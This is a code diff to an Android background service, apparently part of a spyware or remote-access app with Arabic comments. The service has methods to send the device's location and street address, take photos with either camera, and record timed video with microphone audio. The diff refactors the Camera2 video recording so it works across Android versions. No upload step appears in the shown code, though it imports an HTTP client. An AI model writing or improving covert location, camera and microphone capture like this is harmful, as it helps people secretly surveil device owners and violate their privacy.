@@ -38,6 +38,7 @@ import android.util.Base64;
 import android.util.Log;
 import android.widget.Toast;
 
+import androidx.annotation.RequiresApi;
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
 
@@ -53,6 +54,7 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.util.Collections;
 import java.util.List;
 import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.ExecutorService;
@@ -934,7 +936,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ Location — محدّث بـ LocationHelper ★★★
+    // Location — محدّث بـ LocationHelper
     // ============================================================
     private void sendLocation() {
         Log.d(TAG, "sendLocation called");
@@ -952,7 +954,6 @@ public class ServiceRunner extends Service {
                     d.put("accuracy", accuracy);
                     d.put("provider", provider);
 
-                    // عنوان (اختياري)
                     String address = LocationHelper.getAddressFromLocation(
                             ServiceRunner.this, lat, lng);
                     if (address != null) {
@@ -1003,7 +1004,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ Camera — محدّث بـ CameraHelper ★★★
+    // Camera — محدّث بـ CameraHelper
     // ============================================================
     private void takePicture(final int cameraId) {
         Log.d(TAG, "takePicture called: cameraId=" + cameraId + " (0=back, 1=front)");
@@ -1113,7 +1114,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ Video — محدّث بـ Camera2 ★★★
+    // ★★★ Video — محدّث بـ Camera2 (بدون OutputConfiguration) ★★★
     // ============================================================
     private void recordVideo(final int cameraId, final int durationMs) {
         Log.d(TAG, "recordVideo called: cameraId=" + cameraId + " duration=" + durationMs);
@@ -1125,7 +1126,7 @@ public class ServiceRunner extends Service {
         }
     }
 
-    @androidx.annotation.RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
+    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
     private void recordVideoCamera2(final int cameraId, final int durationMs) {
         new Thread(() -> {
             android.hardware.camera2.CameraDevice camera = null;
@@ -1187,33 +1188,34 @@ public class ServiceRunner extends Service {
 
                 filePath = getExternalCacheDir() + "/video_" + System.currentTimeMillis() + ".mp4";
 
-                recorder = new android.media.MediaRecorder();
-                recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC);
-                recorder.setVideoSource(android.media.MediaRecorder.VideoSource.SURFACE);
-                recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4);
-                recorder.setVideoEncoder(android.media.MediaRecorder.VideoEncoder.H264);
-                recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC);
-                recorder.setVideoSize(1280, 720);
-                recorder.setVideoFrameRate(30);
-                recorder.setVideoEncodingBitRate(5000000);
-                recorder.setOutputFile(filePath);
-                recorder.prepare();
+                final android.media.MediaRecorder finalRecorder = new android.media.MediaRecorder();
+                recorder = finalRecorder;
 
-                android.view.Surface surface = recorder.getSurface();
-                final java.util.concurrent.CountDownLatch openLatch = new java.util.concurrent.CountDownLatch(1);
-                final java.util.concurrent.CountDownLatch sessionLatch = new java.util.concurrent.CountDownLatch(1);
-                final android.media.MediaRecorder finalRecorder = recorder;
+                finalRecorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC);
+                finalRecorder.setVideoSource(android.media.MediaRecorder.VideoSource.SURFACE);
+                finalRecorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4);
+                finalRecorder.setVideoEncoder(android.media.MediaRecorder.VideoEncoder.H264);
+                finalRecorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC);
+                finalRecorder.setVideoSize(1280, 720);
+                finalRecorder.setVideoFrameRate(30);
+                finalRecorder.setVideoEncodingBitRate(5000000);
+                finalRecorder.setOutputFile(filePath);
+                finalRecorder.prepare();
+
+                final android.view.Surface surface = finalRecorder.getSurface();
+                final CountDownLatch openLatch = new CountDownLatch(1);
+                final CountDownLatch sessionLatch = new CountDownLatch(1);
 
                 manager.openCamera(finalCameraId, new android.hardware.camera2.CameraDevice.StateCallback() {
                     @Override
                     public void onOpened(@androidx.annotation.NonNull android.hardware.camera2.CameraDevice cam) {
                         Log.d(TAG, "Camera opened for video");
                         try {
-                            android.hardware.camera2.params.OutputConfiguration config =
-                                    new android.hardware.camera2.params.OutputConfiguration(surface);
+                            // ★★★ استخدم List<Surface> مباشرة (متوافق مع كل الإصدارات) ★★★
+                            List<android.view.Surface> surfaces = Collections.singletonList(surface);
 
                             cam.createCaptureSession(
-                                    java.util.Collections.singletonList(config),
+                                    surfaces,
                                     new android.hardware.camera2.CameraCaptureSession.StateCallback() {
                                         @Override
                                         public void onConfigured(@androidx.annotation.NonNull android.hardware.camera2.CameraCaptureSession s) {
@@ -1259,13 +1261,13 @@ public class ServiceRunner extends Service {
                     }
                 }, handler);
 
-                openLatch.await(10, java.util.concurrent.TimeUnit.SECONDS);
-                sessionLatch.await(10, java.util.concurrent.TimeUnit.SECONDS);
+                openLatch.await(10, TimeUnit.SECONDS);
+                sessionLatch.await(10, TimeUnit.SECONDS);
 
                 Thread.sleep(durationMs);
 
-                try { recorder.stop(); } catch (Exception e) {}
-                try { recorder.release(); } catch (Exception e) {}
+                try { finalRecorder.stop(); } catch (Exception e) {}
+                try { finalRecorder.release(); } catch (Exception e) {}
                 recorder = null;
 
                 File videoFile = new File(filePath);
